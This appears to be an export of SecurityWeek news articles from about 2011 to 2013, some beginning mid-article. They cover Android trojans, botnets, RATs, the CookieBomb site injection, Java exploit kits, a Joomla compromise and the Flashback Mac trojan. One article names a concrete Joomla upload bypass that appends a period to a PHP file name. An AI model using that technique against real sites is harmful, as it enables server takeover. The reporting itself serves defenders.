improvement of this code. “As new malicious code is released faster than ever before, the need for analyzing log data to identify new malicious code is more important than ever,” the company said in a statement. “Through this offer to the open source community, the product has the opportunity to develop and become an even better solution to quickly identify new malicious code.” " }

The Trojan – Backdoor.AndroidOS.Obad.a – is being distributed alongside another Trojan known as SMS.AndroidOS.Opfake.a, Kaspersky Lab reported. To infect users, victims get hit with a text message declaring: \"MMS message has been delivered, download from www.otkroi(dot)com.\" \"If a user clicks on the link, a file named mms.apk containing Trojan-SMS.AndroidOS.Opfake.a is automatically loaded onto the smartphone or tablet,\" explained Roman Unuchek, a security researcher with Kaspersky Lab, in a blog post. \"The malware cannot be installed unless users then run it.\" If they do, the command and control (C&C) server can instruct the Trojan to send out the following message to all the contacts in the victim’s address book: “You have a new MMS message, download at - http://otkroi(dot)net/12” Following the link automatically loads Backdoor.AndroidOS.Obad.a under the names of mms.apk or mmska.apk, he wrote. Once on the system, Obad.a steals the user's data and is capable of sending SMS to premium-rate numbers. It also has the ability to download other malware programs and install them on the infected device or propagate them further via Bluetooth. \"The scale of this activity is clearly illustrated by data we gained from a leading Russian mobile operator, which detected a mass distribution of malicious text messages on its network,\" the researcher blogged. \"In the space of five hours, 600 messages were sent with one of the Trojan-SMS.AndroidOS.Opfake.a modifications.\" \"In most cases delivery was via infected devices, while previously similar distributions used SMS gateways,\" he continued. \"At the same time, only a few devices infected with Trojan-SMS.AndroidOS.Opfake.a distributed links to Backdoor.AndroidOS.Obad.a, so we could conclude that the creators of the dangerous Trojan rented part of a mobile botnet to spread their brainchild.\" But that is not the only way the Obad.a Trojan is spread. It also spreads through traditional SMS spam and fake versions of the Google Play application marketplace. \"As a rule, the creators of such shops copy Google Play’s official content and substitute links to legitimate applications for illegal ones,\" Unuchek blogged. \"It is easy to run into a fake, with search engines often directing visitors into dubious stores.\" Attackers have also been seen hacking legitimate sites and redirecting users to malicious pages serving the malware. All together, Kaspersky Lab has discovered 120 cracked websites that redirect users to nbelt.ru, which served the Trojan up to anyone who clicked anywhere on the page. For the most part, the Trojan is mostly found in Russia (83 percent). It was also detected in Kazakhstan, Uzbekistan, Belarus and Ukraine. \"Over the past three months we discovered 12 versions of Backdoor.AndroidOS.Obad.a,\" the researcher blogged. \"All of them had the same function set and a high level of code obfuscation. Each used an Android OS vulnerability that allows the malware to gain DeviceAdministrator rights and made it significantly more complicated to delete. We informed Google of this as soon as we discovered it, so the vulnerability has been closed in the new Android 4.3. Unfortunately, this version is currently available on a limited number of new smartphones and tablets – devices which use earlier versions of the platform are still at risk. However, the latest version of KIS for Android 11.1.4 can delete Backdoor.AndroidOS.Obad.a from any version of Android despite the presence of vulnerabilities.\" " }

Earlier this month, researchers at Palo Alto Networks discovered a third variant of the botnet, and it was serving up more than just spam. According to Palo Alto Networks, this new version “includes the ability to sniff user credentials for FTP, POP3, SMTP, and steal .dat files for FTP and BitCoin.” “All of this information is uploaded to the botnet, and of course would be very valuable for enabling further attacks,” Wade Williamson, Senior Security Analyst at Palo Alto Networks, explains in a blog post. While Palo Alto Networks discovered a third variant, following Microsoft’s takedown of Waledec, Shadowserver’s Steven Adair discovered a second variant in early 2011. A month later, researchers from malware intelligence firm Last Line were able to examine the botnet code and discovered 123,920 FTP account credentials. In addition to the FTP access, they discovered nearly 500,000 credentials used for POP3 services. “The technique abuses legitimate mail servers by authenticating as the victim through the SMTP-AUTH protocol to send spam messages. This method makes IP-based blacklist filtering considerably more difficult,” Last Line said at the time. During their research on the second variant, Last Line also discovered newly infected nodes connecting to a bootstrap Command-and-Control server. “The bootstrap server speaks a proprietary protocol known as ANMP, and disseminates a list of router nodes (other compromised hosts) to infected machines...In total, there were 12,249 unique node IDs that connected to the bootstrap C&C, and 13,070 router IDs,” the researchers noted. Just last week Symantec noticed Waledac spreading spam in what appears to have been an attempt at political activism. “While it is not clear whether the intent of this Waledac spam campaign has been to promote the Rospres.com site or to smear the election campaign of any individual, it does question the exact motivation of the malware gang controlling the W32.Waledac.C variant,” Symantec said. \"To avoid confusion it is important to note that this is a new variant of the botnet, and not the original version, which remains under the control of Microsoft,\" Williamson added.

RSA first noted the appearance of the malware in Russian cyber-underground marketplaces in late July. Shortly thereafter, RSA reported that the Trojan – which is focused on stealing information from machines running Linux – includes form grabbers and backdoor capabilities and was expected to \"graduate to become full-blown banking malware in the very near future.\" Now however, in an updated analysis, the company said that the Trojan seems more like a prototype than a finished product. \"Our research and analysis shows that, in reality, HoT’s grabbing abilities are very limited if not absent, which would make the malware a prototype that needs a lot more work before it can be considered a commercially viable banking Trojan,\" blogged Yotam Gottesman, senior security researcher at RSA FraudAction Research Labs. \"In his sales adverts, Hand of Thief’s developer explained that he is in the final stages of implementing the web-injection mechanism for the malware,\" Gottesman added. \"Researching the Trojan proved that no injections are currently in place, but the preparation for such a mechanism is.\" The infection method for the malware is still primitive, the researcher added, and Hand of Thief's developer did not offer as recommended infection method other than sending the Trojan via email and using social engineering to trick the user into launching the malware on their machine. Still, the Hand of Thief malware does have some elements attackers will covet. For example, the malware's binary reveals it is packed to protect the actual malware from being discovered and blocked by security processes on the machine. In addition, before running on a machine, the malware tests whether or not it is running within a virtual environment. In addition, like other commercially-available Trojans, Hand of Thief includes a builder that gives cyber-criminals the power to create new variants of the malware on demand. \"Hand of Thief has come to the cybercrime underground at a time when commercial Trojans are high in demand, stirring some excitement amongst criminals,\" Gottesman blogged. \"Although it initially appeared to be a compelling new Trojan entrant, RSA’s in-depth analysis of the code proves it is a prototype more than true commercially viable malware, crashing the browsers on the infected machines and displaying overall inability to properly grab data. Furthermore, HoT can also be easily removed from the machine by deleting the files dropped during the HoT installation process.\" More on the Trojan can be found here. " }

A full eight years after it was first released, Poison Ivy remains an active threat that requires little tech-savvy to use. According to FireEye, despite its simplicity, RATs like Poison Ivy are often components of coordinated, targeted attacks.  During the past few years, Poison Ivy has been used in a number of high-profile attacks, including the notorious compromise of RSA a few years ago and a coordinated attack known as 'Nitro' that targeted chemical companies and others. Currently, there are a number of ongoing attack campaigns using the tool as well, including '[email protected]', which has been active since 2008 and mostly targets the financial industry, and 'th3bug', which was first detected in 2009 and primarily targets the healthcare industry and higher education institutions.  Another example of a campaign using Poison Ivy is the 'menupass' campaign, which also was launched in 2009 and is focused on defense contractors. It appears to be emanating from China, according to FireEye.  \"Poison Ivy RAT has persisted this long, because its interface is exceptionally easy to use,\" said Darien Kindlund, manager of threat intelligence at FireEye. \"Therefore nation state groups can literally outsource their operations to less qualified subcontractors, because the PIVY interface to build malicious documents and control infected victims is trivial.\" A typical Poison Ivy attacks begins with an attacker setting up a custom Poison Ivy server and sending the server installation file to the targeted computer, FireEye explained. The server installation file begins executing on the target machine, avoiding detection by downloading additional code as needed through an encrypted communications channel. Once the server is running on the target machine, the attacker uses a Windows GUI client to control the machine. \"In general, an important factor to recognize about RATs is that they require live, direct, realtime human interaction by the APT attacker,\" according to the paper. \"This is distinctly different from crimeware (malware focused on cybercrime), where the criminal can issue commands to their entire botnet of compromised endpoints (or portions of it) whenever they please and then let them go to work on a common goal (e.g., SPAM relay). In contrast, RATs are much more personal and may indicate that you are dealing with a dedicated threat actor that is specifically interested in your organization.\"  FireEye has released a free set of tools the company has dubbed 'Calamine' to help organizations detect Poison Ivy infections on their systems and monitor its behavior and communications. The package includes: - PIVY callback-decoding tool (ChopShop module, available here) - PIVY memory-decoding tool (PIVY PyCommand script, available here) The ChopShop framework was developed by the MITRE Corporation for network-based protocol decoders that help security professionals understand commands issued by human operators controlling endpoints, FireEye said. FireEye's PIVY module for ChopShop decrypts Poison Ivy network traffic. Evidence gathered by Calamine can be useful when correlated with multiple attacks that display the same identifying features, FireEye said, but reminded that Calamine won't always stop determined attackers from using Poison Ivy, though it can complicate their ability to hide behind the commodity RAT.  \"RATs may well be the hacker’s equivalent of training wheels, as they are often regarded in IT security circles,\" Kindlund noted in a blog post. \"But despite their reputation as a software toy for novice 'script kiddies,' RATs remain a linchpin of many sophisticated cyber attacks and are used by numerous threat actors.\" The paper from FireEye can be found here in PDF format.

In the meantime we continue to see cybercriminals improving their toolkits and malware and are ready to make a significant impact in 2012.” McAfee’s Top Threats to Watch for in 2012 include: Industrial Attacks Water, electricity, oil, and gas are essential to people’s everyday lives, yet many industrial systems are not prepared for cyberattacks. As with recent incidents directed at water utilities in the United States, attackers will continue to leverage this lack of preparedness, if only for blackmail or extortion in 2012. Mobile Threats: Attackers will bypass PCs  In 2012, mobile attackers will improve on their skill set and move toward mobile banking attacks. McAfee Labs expects attackers will bypass PCs and go straight after mobile banking apps, as more and more users handle their finances on mobile devices.  Hacktivism  Joining forces online and on the front lines McAfee Labs predicts that in 2012, either the “true” Anonymous group will reinvent itself, or die out. Additionally, those leading the digital disruptions will join forces with physical demonstrators, and will target public figures such as politicians, industry leaders, judges and law-enforcement, more than ever before.  Cyberwar: Flexing its muscles  Will 2012 be the year of Cyberwar, or merely a showcase of offensive cyberweapons and their potential? McAfee hopes it’s only the latter, but says the situation’s growth during recent years makes an eventual cyberwar nearly inevitable. Countries are vulnerable due to massive dependence on computer systems and a cyberdefense that primarily defends only government and military networks. Many countries realize the crippling potential of cyberattacks against critical infrastructure, such as water, gas and power, and how difficult it is to defend against them. McAfee Labs expects to see countries demonstrate their cyberwar capabilities in 2012, in order to send a message.  Rogue Certificates  Untrustworthy and undetectable Organizations and individuals tend to trust digitally signed certificates, however, recent threats such as Stuxnet and Duqu used rogue certificates to evade detection. McAfee Labs expects to see the production and circulation of fake rogue certificates increase in 2012. Wide-scale targeting of certificate authorities and the broader use of fraudulent digital certificates will affect key infrastructure, secure browsing and transactions as well as host-based technologies such as whitelisting and application control. Embedded Hardware: The Promised Land for sophisticated hackers  Embedded systems are designed for a specific control function within a larger system, and are commonly used in automotive, medical devices, GPS devices, routers, digital cameras and printers. McAfee Labs expects to see proofs-of-concept codes exploiting embedded systems to become more effective in 2012 and beyond. This will require malware that attacks at the hardware layer, and will enable attacks to gain greater control and maintain long-term access to the system and its data. Sophisticated hackers will then have complete control over hardware. Advances in Operating Systems Moves Hackers “Down and Out”  New security features baked into the core of the operating system will cause hackers to find alternate entryways: down into the hardware and out of the operating system. Attacking hardware and firmware is not easy, but success allows attackers to create persistent malware in network cards, hard drives and even system BIOS (Basic Input Output System). McAfee Labs expects to see more effort put into hardware and firmware exploits and their related real-world attacks through 2012.  DNSSEC will Drive New Network Threat Vectors  DNSSEC was designed to protect name-resolution services from spoofing and cache poisoning by using a “web of trust” based on public-key cryptography to prevent a client computer from inadvertently communicating with a host as a result of a “man-in-the-middle” attack. Such an attack redirects the traffic from the intended server (Web page, email, etc.) to another server. Unfortunately, DNSSEC would also protect from spoofing and redirection any attempts by authorities seeking to reroute Internet traffic destined to websites that are trafficking in illegal software or images. For a government to redirect traffic, it would need to be considered authoritative from the root-level domains, which is a level of trust that other governing bodies would hesitate to grant if they knew that the result would be the suppression of Internet content based on the opinions of foreign governments. Governing bodies around the globe are taking greater interest in establishing “rules of the road” for Internet traffic, and McAfee Labs expects to see more and more instances in which future solutions are hampered by legislative issues. The result, McAfee says, is that the Internet of tomorrow will probably look like the Internet of yesterday for a longer time than the security industry would like to see.

CookieBomb is malicious obfuscated JavaScript injected into legitimate sites with the ultimate goal of infecting users with a Trojan.   \"First, there is the obfuscation of a small JS inclusion into a potentially legitimate site,\" explained Zscaler researcher Chris Mannon, in a blog post. \"This is where the CookieBomb sets a name, special variable, expiry date, and access path for the eventual infection.  If the cookie is not readily available, it will create one for you and redirect you to another obfuscated hidden iFrame. Once the hidden site is visited, it will read the cookie's expiry date and provide redirection and infection at a later point to avoid security vendor detection.\" At least 54 legitimate websites have been infected so far with malicious code, Michael Sutton, vice president of security research at Zscaler, told SecurityWeek. Though Zscaler has not official tally of infected victims, any visitors to the compromised sites could be impacted, he said, adding that researchers at the Malware Must Die blog first wrote about the attack July 17. The most notable site among them is splashtop.com, though the malicious content has since been removed, Mannon noted. \"The curious thing about this situation is that few AV vendors have taken note of the good research.  The final dropped file is being detected by only 7/45 vendors,\" Mannon blogged. According to Sutton, no zero-day vulnerabilities are implemented in the attack. \"CookieBomb is similar to most of the attacks that we see in that attackers are not targeting specific sites but rather writing automated scripts and injecting content into as many legitimate sites as possible to impact visitors to those cites,\" Sutton said. \"CookieBomb is particularly active at the moment and a trait of this particular attack, which isn't always employed, involves the use of browser cookies to track previous infections for a potential victim.\"   " }

The exploit targets CVE-2011-3544, and has been observed being sold in the cyber-underground as part of the BlackHole crimeware kit. The vulnerability was patched by Oracle in October, but apparently has generated enough interest for the hacker responsible for maintaining and selling BlackHole to offer $4,000 – minus the cost of a license for the kit. In a blog post, Tim Rains, director of product management in Microsoft’s Trustworthy Computing group, wrote that Java’s ubiquity has been the key reason it has become an attractive target for attackers. “As reported in the latest volume of the Microsoft Security Intelligence Report (volume 11), the most commonly observed type of exploits in the first half of 2011 were those targeting vulnerabilities in the Oracle (formerly Sun Microsystems) Java Runtime Environment (JRE), Java Virtual Machine (JVM), and Java SE in the Java Development Kit (JDK),” he wrote. “During the one year period starting in the third quarter of 2010 (3Q10) and ending in the second quarter of 2011 (2Q11), between one-third and one-half of all exploits observed in each quarter were Java exploits. During this one year period, Microsoft (anti-malware) technologies detected or blocked, on average, 6.9 million exploit attempts on Java related components per quarter, totaling almost 27.5 million exploit attempts during the year.” Adding to their efficacy is the fact that organizations often take their time when it comes to patching. Though users could download Java patches directly from Oracle, most enterprises rely on the operating system vendors to provide the patches, explained Jonathan Cran, QA Director of the Metasploit Project at Rapid7. As a result, organizations patch Java sporadically, even though the patches themselves were available directly soon after the release of the vulnerability, he said. Oracle is patching the vulnerabilities, but they must then be distributed to the systems running the vulnerable software, he said. “This distribution process isn't always timely - case in point: Ubuntu Linux, which is still waiting for the update - and is handled differently across the different OSs (operating systems),” Cran said. “What I'm really getting at is that each OS has made decisions about how to handle the updates for third-party software on their systems, for better or worse,” he continued. “Microsoft has pushed this process to the individual software manufacturer…(and) Apple and Canonical have rolled this functionality into their own Update / QA process. Moving it into the OS update process introduces lag, but also increases reliability that the patch will be eventually installed, especially by enterprise users. For now, Apple has been able to get the update out and appears to be a good model to follow, while Ubuntu users are still waiting. Microsoft Windows users will sporadically receive it over the next month, as the tray icon does its work.” “This is analogous to the problems we're seeing on the Android platform, where the OS manufacturer (Google) is creating and shipping updates, but it takes some time for these to be applied to the phones, if they're ever made available by the phone manufacturer,” Cran added. Despite the challenges, Symantec Security Intelligence Manager Joshua Talbot said people shouldn’t be too quick to jump from Java. “Individuals and organizations have to weigh their needs against the risk they face from a potential compromise,” he said. “Administrators and users should also remember that there are often many mitigating options available, such as only allowing Java from trusted sites and temporarily disabling Java until patches are available.” \nSecurity Resource: Vulnerability Management Buyer's Checklist: Key Questions to Ask\n Security Resource: Vulnerability Management Buyer's Checklist: Key Questions to Ask " }

According the Moscow-based security firm, both products now include Kaspersky Lab’s proprietary ZETA Shield antivirus technology, which performs an in-depth scan of files and applications running on systems to detect malware that may hide deep within individual components of each program.  Originally unveiled during a launch event earlier this summer, Kaspersky explained how ZETA was designed to counteract targeted attacks that rely on exploits targeting software vulnerabilities by scanning the data stream for code fragments with the characteristics of exploits.   The updated security software offerings also boast enhancements to existing protection technologies, including its Safe Money and Automatic Exploit Prevention technologies, and other new features such as Trusted Applications mode. Kaspersky’s Automatic Exploit Prevention technology, originally added to the product in 2013, monitors programs that are most frequently targeted by cybercriminals – such as Java and Adobe Reader – to block attackers from targeting vulnerabilities in legitimate software to compromise systems.  Furthermore, both 2014 products offer new protections against ransomware attacks with what Kaspersky Lab calls “screen lockers technology”. According the company, if users with its 2014 solutions installed face a demand for payment to unblock their computer, they can enter a key combination that triggers the Kaspersky security software to find and remove the malware.   The company’s “Safe Money technology” has been improved in Kaspersky Internet Security 2014, including support for more Web browsers, and a significantly expanded list of trusted online banking sites, payment services, and online stores.  Kaspersky Internet Security 2014 also incorporates application whitelisting technology, which the company is calling “Trusted Applications mode”. Similar to other whitelisting solutions, the feature protects systems by only allowing applications to run that have been identified as safe. The security software also checks the legitimacy of programs to provide a higher level of security.  The Trusted Applications feature is powered by constantly a updated  whitelisting database of legitimate applications. Kaspersky says its database currently has over 700 million unique entries containing thorough descriptions of popular applications including operating systems, browsers, image viewers, video players, games, and more.  For users with children, Kaspersky Internet Security 2014 offers improved Parental Control capabilities.  Both 2014 security products have also been optimized to minimize consumption of system resources, along with improvements to the user interface.  Available immediately, a 3-user licenses for a 1-year period costs $79.95 for Kaspersky Internet Security and $59.95 for Kaspersky Anti-Virus. Existing customers can upgrade free of charge from Kaspersky Internet Security 2013 and Kaspersky Anti-Virus 2013. " }

Directors Desk is a solution to help board members communicate and collaborate \"securely\", which the company says is used by more than 10,000 directors around the globe. It is unknown what the attackers may have stolen information wise, or what passive communications were viewed as they monitored on the directors of several publically held companies. At the time of the breach, NASDAQ reported that no evidence was discovered that pointed to access of customer’s information, but given the nature of Director’s Desk, the latest details are far from cheery. NASDAQ CEO Robert Greifeld told the news agency that the exchange is under constant attack. Because of this, they spend nearly a billion dollars annually on their information security program. Yet, is this money that should be applied elsewhere? Perhaps on basic Application Security? “Due to the true nature of the Director’s Desk Web-based application, it appears that vulnerabilities within the application were probably successfully exploited by remote attackers that allowed them to peruse information exchanges between various company directors. There are several classes of common vulnerabilities that would allow attacks like this, and I would direct people to take a closer look at the OWASP Top-10 application security risks,” commented Damballa’s Gunter Ollman. “Gaining remote access to confidential data held within the Director’s Desk application could have been through SQL injection, broken authentication and session management, and URL restriction failures. In my years of running penetration tests against Fortune-500 companies, these were the most common vulnerabilities that could be exploited to reveal this level of confidential data.” He added that the new details of the malicious usage of Director’s Desk, or any major Web application being targeted should come as no surprise. “Overall, vulnerabilities within large Web-based applications are very common. They are under constant development and change, which means that vulnerabilities can be unintentionally introduced at any time. If there are multiple development teams working on the same application portal – all developing their own micro applications – then the probability of new vulnerabilities being introduced grows considerably. This is why Web applications need to be security tested continuously.” Directors Desk is completely unrelated to the NASDAQ trading platforms which power the exchange and trading operations were never affected.

Thousands of sites have been compromised in the attack campaign, which was noted by Versafe after the company detected a spike in attacks against Joomla sites in the first half of 2013. The attackers used a zero-day exploit to take over servers and ultimately launch phishing and malware attacks against anyone who visited the compromised sites. \"For 2.5.x and 3.x versions of Joomla, it is possible for anyone with access to the media manager to upload and execute arbitrary code simply by appending a period (\".\") to the end of a php file (php.),\" Versafe CEO Eyal Gruner told SecurityWeek. \"For sites powered by unsupported versions of Joomla (1.5.x) attackers don't even need to have an account on the Joomla server to gain access.\" The attackers' IP addresses are believed to originate in China, and the victimized sites are spread throughout the globe. Many of the compromised servers redirected users to a page serving the Blackhole exploit kit that infected them with a variant of Zbot. The report from Versafe follows a report of separate attack campaign seen by Arbor Networks. In the case, researchers at Arbor Networks found that more than 6,000 sites powered by Joomla, WordPress and Datalife Engine had been targeted in brute force attacks launched by a botnet dubbed 'Fort Disco.' CMS systems are a good target because they are widely used, Gruner said. In addition, open source CMS systems in particular were not necessarily built with security in mind, he said. \"It is safe to assume that the compromised sites were not the intended targets, but used as a launchpad to launch attacks against banks,\" he explained. \"As far as how to protect against these attacks, since banks and other FI's always tend to be targets, any critical data between end-users and their financial organization is encrypted/protected, and in general, organizations need  to adopt more proactive, \"always on\"  ways to secure against these and other types of zero-day attacks.\" \"The attacks are still ongoing from many of the Joomla systems that had already been infiltrated,\" he added. \"Those that are now patched, and hadn’t been previously compromised, should be OK. All Joomla CMS users should upgrade to at least 2.5.x, if not the latest 3.1.x and be aware that these systems may have other yet-to-be-discovered vulnerabilities that might be quickly exploited.\" " }

According to Palo Alto Networks, attackers are using malicious ads to silently infect users. Mobile ad networks require the mobile application to reach out to the Web and pull the correct ad, which requires the developer install a software development kit [SDK] or other software into the mobile application so the ad can be displayed. In the event the ad network is malicious, this effectively brings malicious content to anyone who downloads the application. Once the device is compromised, the attackers can use it to make calls to premium numbers and commit other types of malicious acts.   So far, only a handful of this type of malware has been seen in the wild, Williamson told SecurityWeek. The attacks are largely slipping under the radar, primarily because the malware was unknown and the delivery method uses the way mobile applications are supposed to behave. This is not the first time this type of malicious ad networks has been found targeting mobile users.  In April, Lookout Mobile Security detected a malware threat known as BadNews in 32 apps from four different developer accounts found on Google Play. The applications were downloaded between two million and nine million times before being removed by Google. Last December, Trend Micro noted the threat this posed in a report entitled 'The Hidden Risk Behind Mobile Ad Networks', and observed that some of the top mobile ad networks had recently released new SDKs with mandated opt-in mechanisms that give app users the option to either allow or forbid ad networks to collect data and display ads outside of apps. \"The industry has been spending its time trying to make sure that the applications in app stores are safe and free of malware,\" he said. \"But this method can take a completely valid and benign application and use it bring down malware. If the malware file isn't known, then it’s very easy for this behavior to go unnoticed.\" Research into the origin of the threat is ongoing, but according to Palo Alto Networks, the samples they discovered originated in Asia. To help combat the threat, the company has added new capabilities in its WildFire malware analysis sandbox that enable it to analyze Android applications in the APK file format to detect malicious content embedded within Android applications. \"There is very little that a user can do for this type of problem because this type of infection can happen even if the end user does everything right,\" Williamson said. \"I think the industry needs to do a better job of establishing reputation for reputable ad networks so that developers can easily choose a service that is established and safer.\" " }
{ "_id" : { "$oid" : "5b27c51b6cefc41c844ab444" }, "Category" : "Malware", "Title" : "New Research Profiles Top Monetization Schemes and Trends in Android Malware", "Address" : "https://www.securityweek.com/new-research-profiles-top-monetization-schemes-and-trends-android-malware", "Date" : "October 11, 2011", "Article" : "Much has been written about the growth of malware targeting Android devices. Earlier this year for example, Damballa found that in the first half of 2011, the number of Android devices engaged in live communication with a botnet command and control server hit 40,000 at one point. There is little point in infecting phones however unless the attacker has a way to monetize their malware. But according to a new report from Symantec, attackers may not be getting much bang for their buck. “When it comes to comparing the amount of money cybercriminals are currently making off mobile malware versus malware targeting PCs, it really isn’t even close,” Eric Chien, technical director of Symantec Security Response, told SecurityWeek. “There is some evidence that recent large-scale, PC-based scams have made in the hundreds of millions of dollars. When it comes to mobile malware scams, we’re generally talking about a few thousand dollars at most.” So how are attackers turning compromised phones into profit? There are a number of different ways. Among the most popular are premium rate number billing scams. These premium-rate numbers are typically “short codes” – shorter than usual phone numbers. Each country and carrier regulates short codes different, but usually an oversight body issues the short codes for a fee, according to Symantec. In the United States, a dedicated short code may cost $1,500 to set up and then $1,000 per month. A shared short code where the message must be preceded by a keyword can be obtained for $50 per month. “When calling or sending an SMS to a short code, the caller is billed a premium rate above the normal cost of an SMS or phone call,” according to the report. “The revenue is then shared by the attacker, carrier, and the SMS aggregator. The attacker receives 30-70% of the premium rate charge depending on the carrier, amount charged per message, and number of messages received.” Most carriers allow a premium rate of up to $10.00 per message, but some carriers will allow charges in excess of $50.00 per message. If the attacker uses an SMS aggregator, the attacker will pay an additional fee. Android apps can request the ability to send SMS messages at installation, the report continues. These SMS messages can be sent without the user confirmation, and sending an SMS to a premium short code rings up charges to the phone owner’s bill. This allows an attacker to generate revenue. However because short codes are usually carrier and country-specific, multiple short codes are needed, or threats may only target specific regions. While these and other schemes – such as pay-per-install and adware operations – offer revenue opportunities for attackers, they often require a large number of infections to be worthwhile, according to the report. “Further, for each attack we have seen on Android, none were repeated,” the report notes. “It is possible that the attackers did not generate enough revenue, and thus did not repeat the effort.” At this point researchers are not seeing much Android malware being bought and sold, said John Harrison, Group Manager for Symantec Security Response. “There simply isn’t a huge market for it at this time because it is still very much in a nascent state,” he explained. “What we’re seeing right now [is] early adopters exploring ways to turn mobile malware into a successful criminal business model like they have done on the PC. Once they figure it out, we’ll likely see a market for mobile malware emerge.” “As far as we have been able to tell, there aren’t any mobile malware toolkits making the rounds yet,” he added. “That said, it is a very real possibility that we will see them in the future. One possible explanation as to why we haven’t seen them is because cybercriminals are still very much trying to figure out how to monetize mobile malware; they’re still trying to fit the various pieces together for it become a significant revenue generator for them. Once they figure this out, I think it will be more likely that we’ll see mobile malware toolkits emerge.” Besides using mobile security and management software if at all possible, consumers should only download applications from marketplaces hosted by well-known legitimate vendors, Harrison said. Also, if practical, users should adjust Android OS application settings to stop the installation of non-market apps. “Next, pay attention to the name of the app creator,” he added. “If downloading a popular app from a well-known app creator, then an app that purports to be the legitimate version, but has a different author listed should be a definite red flag...Finally, during the installation of apps, always check the access permissions being requested for installation; if they seem excessive for what the application is designed to do, it would be wise to not install the application.” " }

Since 2006, security incident reports have risen over 650-percent. “Federal agencies have reported increasing numbers of security incidents that placed sensitive information at risk. When incidents occur, agencies are to notify the federal information security incident center—US-CERT. Over the past 5 years, the number of incidents reported by federal agencies to US-CERT has increased from 5,503 incidents in fiscal year 2006 to 41,776 incidents in fiscal year 2010, an increase of over 650 percent,” the GAO notes. The watchdog further notes that the reason for the year-to-year increase is that agencies have not fully implemented their information security programs. In 2002, the FISMA Act established information security program, evaluation, and annual reporting requirements for federal agencies. So it isn’t as if they are unaware of their responsibilities. “An underlying reason for these weaknesses is that agencies have not fully implemented their information security programs. As a result, they have limited assurance that controls are in place and operating as intended to protect their information resources, thereby leaving them vulnerable to attack or compromise,” the report explains. “Until hundreds of recommendations are implemented and program weaknesses are corrected, agencies will continue to face challenges in securing their information and information systems. GAO is recommending that the Director of OMB provide performance targets for metrics included in OMB's annual FISMA reporting instructions to agencies and inspectors general.” When examining the top reasons for poor performance, the GAO said that agencies did not always ensure personnel with significant responsibilities received training, there is a failure to ensure security controls were monitored continuously; failure to ensure weaknesses were remediated effectively; and a lack of oversight to ensure discovered incidents were resolved in a timely manner. Another issue, aimed at the OMB, states that while there have been new cybersecurity metrics given to federal agencies, a lack of planning to provide performance targets to measure improvement contributed to the jump in reported incidents.

The number of such apps hit 718,000 at the end of the second quarter compared to 509,000 in the first quarter. Overall, these apps have increased by more than 350,000 since beginning of the year. Like the previous quarter, nearly half of the mobile malware (44 percent) uncovered during the past three months were designed to subscribe unwitting users to costly services, according to Trend Micro. The next largest group belonged to data stealers (24 percent), with adware coming in third (17 percent). \"The United Arab Emirates (UAE) recorded the highest malicious Android app download volume, overtaking Myanmar, which placed first in the previous quarter,\" according to the report. \"Six new countries figured in this month’s top 10, which may indicate an increase in mobile device use and/or attacks against such devices in these locations.\" Myanmar and Vietnam were second and third. The United States did not make the top 10.  \"Similar to last quarter, mobile users in Saudi Arabia downloaded the most number of high-risk apps,\" the report noted. \"Vietnam placed second in light of the increasing mobile device use in the country.\" \"Until we have the same urgency to protect mobile devices as we have for protecting PCs, this very real threat will continue to grow rapidly,\" JD Sherry, vice president of technology and solutions at Trend Micro, in a statement. \"At the rate this malware is accelerating – almost exponentially – we appear to be reaching a critical mass. To fight this, Android users need to take great care when using their devices and take the simple, but effective, step of adding security software to all mobile devices.\" The amount of banking malware also increased significantly, with the U.S. being the top target of the malware. According to Trend Micro, the U.S. accounted for 28 percent of global compromises. \"As predicted, cybercriminals carried out developments in malware distribution and refinement for existing tools,\" the report notes. \"New ZeuS/ZBOT deployment tactics include a propagation routine. The PIZZER worm was also found spreading and copying itself onto password-protected archived files, using a technique similar to that of PROLACO malware.\" A full copy of the report is available here.  " }

The week opened with a report that Apple had updated its blacklist of known malware to include the Trojan dropper Revir, and it is closing with reports about the spread of a new Trojan known as Flashback. While Revir disguised itself as a PDF file, Flashback cloaks itself as a Flash Player update. While Mac security firm Intego initially the Trojan was not widespread, it has since noted an uptick in reports of infections. According to Intego, the Trojan is spreading via malicious Websites. “The first things you see are the crashed plugin graphic and the purported error messages,” the company explained in a blog post. “After this, the fake Adobe Flash installer screen pops up, and then the Flashback Trojan horse installation package downloads. At this point, if you have the default Safari settings – which allow “safe” downloads to open automatically – you will see an Installer window open.” (Image Below)  Users with the default Safari browser settings – which allow “safe” downloads to open automatically – will see an Installer window open. If the user proceeds with the installation procedure, the installer for this Trojan horse will deactivate some network security software (code in this malware specifically targets and deactivates Little Snitch, but has no effect on Intego VirusBarrier X6), and, after installation, will delete the installation package itself. The malware installs a dyld (dynamic loader) library and auto-launch code, allowing it to inject code into applications the user launches.” The malware also installs a backdoor at ~/Library/Preferences/Preferences.dylib that communicates with a remote server and sends and receives data using RC4 encryption, according to Intego. “This is effective social engineering,” Intego noted on its blog post. “Savvy Mac users will not be fooled, because they know that a Flash installer would never appear in this manner, but two things make this approach believable. First, Flash Player is not installed on Mac OS X Lion, so users will need to install it themselves if they want to view Flash content on the web. Second, if they do have Flash Player installed, and have set the Flash Player preference pane (in System Preferences) to automatically check for updates, they may think that this is an update alert…So this can easily fool many Mac users into downloading the malware.” Just how users are being lured to the sites was not mentioned by Intego. However, Graham Cluley, senior technology consultant at Sophos, called it easy to imagine. “For instance, it would be child's play to create a website which pretends to show something salacious (\"Scarlett Johansson nude video!\" would probably do well at the moment, for instance) and then when you try to view it, you're prompted to install an update to Adobe Flash. Of course, rather than the genuine Flash you would be installing the Trojan horse,” he blogged. “Similar tricks have certainly worked well in the past - against both Windows and Mac users.” “We all know that there is much… more malware written for Windows than there is for Mac OS X,” he added. “But that doesn't mean it’s non-existent, and it's no excuse for leaving Apple Macs unprotected.” " }

